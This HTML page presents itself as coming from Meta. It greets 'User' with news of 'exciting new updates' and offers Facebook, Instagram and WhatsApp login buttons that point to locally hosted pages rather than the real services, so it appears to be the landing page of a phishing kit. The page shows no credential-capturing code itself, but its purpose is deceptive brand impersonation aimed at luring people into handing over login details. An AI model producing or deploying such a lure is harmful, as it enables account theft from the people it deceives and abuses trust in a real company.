<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@100..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

    <style>
        html,
        body {
            margin: 0;
            padding: 0;
            height: 100%;
            box-sizing: border-box;
        }

        *,
        *::before,
        *::after {
            box-sizing: inherit;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            flex-direction: row;
            background-color: #8ccbff;
            padding: 0;
            font-family: sans-serif;
        }

        .img-cont {
            max-width: 100%;
            display: flex;
            justify-content: center;
            flex: 1.4;
            padding: 1%;
        }

        .bcg-img {
            max-width: 100%;
            height: auto;
            object-fit: cover;
            border-radius: 2em;
        }

        .text-div {
            flex: 1;
            display: flex;
            align-items: center;
            flex-direction: column;
            padding: 1em;
            box-sizing: border-box;
            justify-content: center;
            height: 100%;
        }

        h1 {
            font-size: 3em;
            text-align: center;
            color: #6F00FF;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }

        p {
            font-family: sans-serif;
            font-size: 1.1em;
            font-weight: 300;
            text-align: center;
            color: #3457D5;
        }

        .pages-div {
            display: flex;
            flex-direction: column;
            gap: 1em;
            width: 100%;
            align-items: center;
            margin-top: 2em;
        }

        a {
            text-decoration: none;
            width: 80%;
            border-radius: 1em;
            cursor: pointer;
            transition: 1s;
            display: flex;
            flex-direction: row;
            align-items: center;
            padding-inline: 1em;
        }

        .insta-btn {
            background: linear-gradient(94deg, rgba(215, 82, 184, 1) 5%, rgba(227, 222, 73, 1) 88%);
        }

        .fb-btn {
            background: linear-gradient(94deg, rgba(2, 87, 172, 1) 10%, rgba(24, 183, 213, 1) 100%);
        }

        .wapp {
            background: linear-gradient(94deg, rgba(59, 219, 22, 0.9108018207282913) 27%, rgba(136, 198, 111, 1) 100%);
        }

        a div {
            flex: 1;
            display: flex;
            color: white;
            align-items: center;
            gap: 2em;
        }

        a div p {
            color: white;
            font-weight: 500;
            font-size: 1em;
        }

        a div i {
            font-size: 2em;
        }

        i {
            color: white;
        }

        .insta-btn:hover {
            background: linear-gradient(94deg, rgba(215, 82, 184, 1) 50%, rgba(227, 222, 73, 1) 88%);
        }

        .fb-btn:hover {
            background: linear-gradient(94deg, rgba(2, 87, 172, 1) 50%, rgba(24, 183, 213, 1) 100%);
        }

        .wapp:hover {
            background: linear-gradient(94deg, rgb(86, 235, 52) 60%, rgb(133, 223, 97) 80%);
        }
    </style>
</head>

<body>
    <div class="img-cont">
        <img class="bcg-img"
            src="https://images.unsplash.com/photo-1665799871677-f1fd17338b43?fm=jpg&q=60&w=3000&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8Nnx8bWV0YSUyMGxvZ298ZW58MHx8MHx8fDA%3D"
            alt="">
    </div>

    <div class="text-div">
        <h1>Hello User!</h1>
        <p>We have some exciting new updates for you! Sign in to explore the latest features in our website or app
            below.</p>

        <div class="pages-div">
            <a href="./facebook.html" class="fb-btn">
                <div>
                    <i class="fa-brands fa-facebook-f"></i>
                    <p>Login with Facebook</p>
                </div>
                <i class="fa-solid fa-chevron-right"></i>
            </a>

            <a href="./instagram.html" class="insta-btn">
                <div>
                    <i class="fa-brands fa-instagram"></i>
                    <p>Login with Instagram</p>
                </div>
                <i class="fa-solid fa-chevron-right"></i>
            </a>

            <a href="./whatsapp.html" class="wapp">
                <div>
                    <i class="fa-brands fa-whatsapp"></i>
                    <p>Login with WhatsApp</p>
                </div>
                <i class="fa-solid fa-chevron-right"></i>
            </a>
        </div>

        <p style="font-size: 1em;">by Meta</p>
    </div>

</body>

</html>
